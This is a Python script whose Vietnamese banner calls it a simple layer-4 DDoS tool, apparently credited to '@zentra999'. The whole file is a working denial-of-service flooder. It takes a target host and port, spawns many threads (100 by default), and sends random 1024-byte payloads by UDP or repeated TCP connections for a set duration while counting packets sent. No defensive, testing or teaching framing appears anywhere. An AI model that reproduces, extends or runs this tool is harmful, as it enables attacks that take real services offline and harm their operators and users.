import socket
import threading
import random
import time
import argparse

total_sent = 0
count_lock = threading.Lock()

def send_udp(ip, port, dur):
    global total_sent
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)
    timeout = time.time() + dur
    while time.time() < timeout:
        try:
            s.sendto(data, (ip, port))
            with count_lock:
                total_sent += 1
        except:
            continue

def send_tcp(ip, port, dur):
    global total_sent
    timeout = time.time() + dur
    data = random._urandom(1024)
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.send(data)
            sock.close()
            with count_lock:
                total_sent += 1
        except:
            continue

def stats(dur):
    global total_sent
    start = time.time()
    while time.time() - start < dur:
        time.sleep(1)
        with count_lock:
            print(f"[!] Đã gửi {total_sent} gói")

def runner():
    print("=" * 50)
    print("   Công cụ ddos layer4 đơn giản")
    print("   Nguồn: @zentra999")
    print("=" * 50)

    parser = argparse.ArgumentParser()
    parser.add_argument("host", help="IP hoặc tên miền")
    parser.add_argument("-p", "--port", type=int, required=True)
    parser.add_argument("-m", "--mode", choices=["udp", "tcp"], default="udp")
    parser.add_argument("-c", "--concurrent", type=int, default=100)
    parser.add_argument("-s", "--seconds", type=int, default=60)
    opt = parser.parse_args()

    print(f"[*] Bắt đầu gửi gói {opt.mode.upper()} đến {opt.host}:{opt.port} trong {opt.seconds} giây")

    flood = send_udp if opt.mode == "udp" else send_tcp

    threading.Thread(target=stats, args=(opt.seconds,), daemon=True).start()

    thread_pool = []
    for _ in range(opt.concurrent):
        th = threading.Thread(target=flood, args=(opt.host, opt.port, opt.seconds))
        th.daemon = True
        th.start()
        thread_pool.append(th)

    for th in thread_pool:
        th.join()

    print(f"[#] Xong. Tổng gói: {total_sent}")

if __name__ == "__main__":
    runner()